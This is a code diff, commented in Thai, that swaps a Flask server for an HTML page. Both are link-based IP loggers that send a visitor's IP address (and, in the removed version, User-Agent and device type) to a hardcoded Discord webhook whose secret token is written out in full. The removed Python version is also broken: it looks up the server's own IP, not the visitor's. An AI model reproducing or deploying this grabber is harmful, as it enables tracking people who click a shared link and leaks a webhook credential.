@@ -1,42 +1,40 @@
-from flask import Flask, request
-import requests
+<!DOCTYPE html>
+<html lang="th">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ตรวจจับ IP</title>
+    <script>
+        // ใช้ API จาก ipify เพื่อดึง IP
+        async function getIpAndSendToDiscord() {
+            // เรียก API เพื่อดึง IP ของผู้ใช้
+            const ipResponse = await fetch('https://api.ipify.org?format=json');
+            const ipData = await ipResponse.json();
+            const userIp = ipData.ip;
 
-app = Flask(__name__)
+            // ข้อมูลที่จะส่งไปยัง Discord Webhook
+            const discordPayload = {
+                content: `Someone clicked the link! IP: ${userIp}`
+            };
 
-# Webhook URL ของคุณ
-DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1302448307775471646/v4lagRRls5NHggJWwlaWPfIpsz3isk0xLeYG7bECQl799ijnAkHECqgIq4GfT2_Lrxgk"
-IPIFY_API_URL = "https://api.ipify.org?format=json"  # API สำหรับดึง IP ของผู้ใช้
+            // ส่งข้อมูลไปยัง Discord Webhook
+            await fetch('https://discord.com/api/webhooks/1302448307775471646/v4lagRRls5NHggJWwlaWPfIpsz3isk0xLeYG7bECQl799ijnAkHECqgIq4GfT2_Lrxgk', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(discordPayload)
+            });
 
-@app.route("/", methods=["GET"])
-def send_ip():
-    # เรียกใช้ ipify API เพื่อดึง IP ของผู้ใช้
-    try:
-        ip_response = requests.get(IPIFY_API_URL)
-        ip_data = ip_response.json()
-        user_ip = ip_data.get("ip")  # ดึง IP จากผลลัพธ์ API
-
-        user_agent = request.headers.get("User-Agent")  # ดึงข้อมูล User-Agent
-
-        # เช็คว่า User-Agent มาจาก PC หรือมือถือ
-        if "Mobile" in user_agent:
-            device_type = "Mobile"
-        else:
-            device_type = "PC"
-
-        # ข้อมูลที่จะส่งไปยัง Discord
-        payload = {
-            "content": f"มีคนกดลิงก์! IP: {user_ip}, อุปกรณ์: {device_type}, User-Agent: {user_agent}"
+            // แสดงข้อความว่าเสร็จสิ้น
+            alert('IP ถูกบันทึกและส่งไปยัง Discord แล้ว!');
         }
-
-        # ส่งข้อมูลไปยัง Discord Webhook
-        response = requests.post(DISCORD_WEBHOOK_URL, json=payload)
-        if response.status_code == 204:
-            return "ส่งสำเร็จ!", 200  # ส่งข้อมูลสำเร็จ
-        else:
-            return f"ไม่สามารถส่งข้อมูลได้: {response.status_code}, {response.text}", 500
-
-    except Exception as e:
-        return f"เกิดข้อผิดพลาด: {str(e)}", 500
-
-if __name__ == "__main__":
-    app.run(host="0.0.0.0", port=5000)
+    </script>
+</head>
+<body>
+    <h1>คลิกที่ลิงก์เพื่อบันทึก IP ของคุณ</h1>
+    <p>
+        <a href="javascript:void(0)" onclick="getIpAndSendToDiscord()">คลิกที่นี่เพื่อบันทึก IP</a>
+    </p>
+</body>
+</html>
